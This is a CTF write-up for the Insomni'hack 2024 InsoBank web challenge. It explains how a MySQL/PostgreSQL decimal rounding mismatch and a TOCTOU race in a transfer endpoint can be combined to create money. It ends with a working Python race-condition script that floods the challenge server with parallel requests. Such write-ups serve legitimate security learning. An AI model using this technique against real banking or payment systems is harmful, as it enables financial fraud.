---
title: Insomni'hack CTF Teaser 2024 - InsoBank Writeup
description: Exploit MySQL decimal rounding off and TOCTOU race condition in a Internet Banking website. 
date: 2024-01-21 19:15:00 +0530
categories: [CTF Writeup, Insomni'hack CTF Teaser 2024]
tags: [web, race-condition]
---

## Challenge
![Challenge description - Vaulty](../images/insobank/challenge.png){:style="display:block; margin-left:auto; margin-right:auto"}  
We're launching a new online Bank today which is of course backed by crypto and AI which makes it better than any other banking system out there.

It's not fully featured yet as you can only transfer money within your own accounts, but you can already see how superior it is to other systems:

http://91.92.201.197:3000/

Source: [here](https://static.insomnihack.ch/media/insobank-8ebe9b5ceef733e4eaa6d32f2707381a111b16aee63980b4583ab1e44d964d8d_BLFUOJ6.tgz)

## TL;DR
- We are given an internet banking website with option to only transfer funds within own accounts. The goal is to increase balance from 10 CHF to 13.37 CHF.
- Two databases (MySQL and Postgresql) are used to store transactions. MySQL schema rounds-off amount to 2 decimal places, but postgresql does not.
- We can create transactions such that the sum of amount exceeds source account balance by exploiting the rounding off.
- For this to work, we need transactions with dupclicate recipients. We exploit a TOCTOU race condition to bypass duplicate check.

## Finding the vulnerabilities

### 1. Recon 
We are provided an internet banking website with option to only transfer funds within own accounts. There exists 3 accounts namely Checkings, Savings and Current. Initially we have 10.0 CHF (Swiss Franc) in checkings account. We can create transaction to send funds between these 3 accounts. However, to obtain flag, we need to have a balance of 13.37 CHF in single account. In other words, we need to create free money.

### 2. Decimal round-off 
The challenge uses MySQL to store all user details and transactions. But, pending transactions alone are duplicated into a seperate Postgresql database. From looking at the schema of these two, we can find that the column type of amount is different.  
- MySQL has **DECIMAL(10, 2)** 
- Postgresql has **DECIMAL**  

This means we can exploit the fact that MySQL rounds-off amount to 2 decimal places, whereas postgresql stores exact amount. Transaction validation is performed on MySQL when trasaction is finalized using `/validate` endpoint. However, actual execution happens using Postgresql amount in a periodic script. Also note that one transaction batch can contain multiple transactions.  
  
We can create a transaction batch like below (balance in Checking account : 10 CHF),  
<table>
<thead>
  <tr>
    <th>Source</th>
    <th>Recipient</th>
    <th>Amount</th>
  </tr>
</thead>
<tbody>
  <tr>
    <td>Checkings</td>
    <td>Current</td>
    <td>10</td>
  </tr>
  <tr>
    <td>Checkings</td>
    <td>Savings</td>
    <td>0.004</td>
  </tr>
  <tr>
    <td>Checkings</td>
    <td>Savings</td>
    <td>0.004</td>
  </tr>
</tbody>
</table>

- Validation on MySQL (rounded off to 2 decimal):  
    - 10.00 + 0.00 + 0.00 = 10 (Sufficient funds in source account)  
- Execution using Postgresql: 
    - 10.00 + 0.004 + 0.004 = 10.008  
- When 10.008 is stored in MySQL, it becomes 10.01 CHF  

Now we repeat this until we have 13.37 CHF. However there is a catch. We cannot create above transaction as `/transfer` endpoints checks that two transactions in same batch cannot have same destination account. In our example, we have two entries with savings account as recipient.  
![/transfer check](../images/insobank/transfer-check.png)

### 3. TOCTOU race condition
The Flask app is running in a multi-threaded WSGI server. There is a race condition TOCTOU vulnerability in `/transfer` endpoint. The check is implemented as below,
```none
1. 'Select count(*)' query to fetch if same recipient already added in this batch  
2. if exists, return error "You can have only one transfer per recipent in a batch"  
3. Add transaction to batch
```
This logic is not thread safe and vulnerable to Time of check, time of use (TOCTOU) attack. We can create multiple duplicate requests to server. As all are executed in parallel, We hope multiple requests will cross the select query (step 1) at same time, before any transaction is added to batch. This way, we can bypass this check and add duplicate recipients.

## Exploit 

In order to create parallel request to trigger race condition, Burp suite needed professional license. I used [this tool](https://github.com/nccgroup/requests-racer) instead.

```python
from requests_racer import SynchronizedSession

s = SynchronizedSession()

# Update JWT after creating a fresh login session
burp0_headers = {"Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTcwNTgyNjg5NSwianRpIjoiY2UzYTBlMjktNjE4OS00ZTE0LTgzM2YtNDdjNzE4ZjFkY2M5IiwidHlwZSI6ImFjY2VzcyIsInN1YiI6NDg2OSwibmJmIjoxNzA1ODI2ODk1LCJjc3JmIjoiMjYzNDk0YmEtODgyZS00ODMzLWJmZDMtOTdhNzZiYjMzNzRkIiwiZXhwIjoxNzA1ODI3Nzk1fQ.biCkHQ-6U3aDWGJ1A1h-4GWK9wz6exEOLFzQ8aym1_g", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.216 Safari/537.36", "Accept": "*/*", "Origin": "http://91.92.201.197:3000", "Referer": "http://91.92.201.197:3000/", "Accept-Encoding": "gzip, deflate, br", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}

for n in range(20):

    burp0_url = "http://91.92.201.197:5000/batches"
    resp1 = s.get(burp0_url, headers=burp0_headers)
    s.finish_all()
    old_batches = [o['batchid'] for o in resp1.json()]

    burp0_url = "http://91.92.201.197:5000/batch/new"
    burp0_json={"senderid": "dc9d1d35-ef4d-4406-957c-93acc318d435"}
    resp = s.post(burp0_url, headers=burp0_headers, json=burp0_json)
    s.finish_all()

    burp0_url = "http://91.92.201.197:5000/batches"
    resp1 = s.get(burp0_url, headers=burp0_headers)
    s.finish_all()
    new_batchid = [o['batchid'] for o in resp1.json() if o['batchid'] not in old_batches][0]

    print(f"New batch: {new_batchid}")

    s = SynchronizedSession(num_threads=20)

    burp0_url = "http://91.92.201.197:5000/transfer"
    burp0_json={"amount": "0.004", "batchid": new_batchid, "recipient": "4f55f4f1-9fb5-48a7-af32-d910b46ca8ca"}
    resps = []
    for i in range(20):
        resps.append(s.post(burp0_url, headers=burp0_headers, json=burp0_json))
    s.finish_all()
    print([resp.text for resp in resps])

    burp0_url = "http://91.92.201.197:5000/validate"
    burp0_json={"batchid": new_batchid}
    s.post(burp0_url, headers=burp0_headers, json=burp0_json)
    s.finish_all()
```
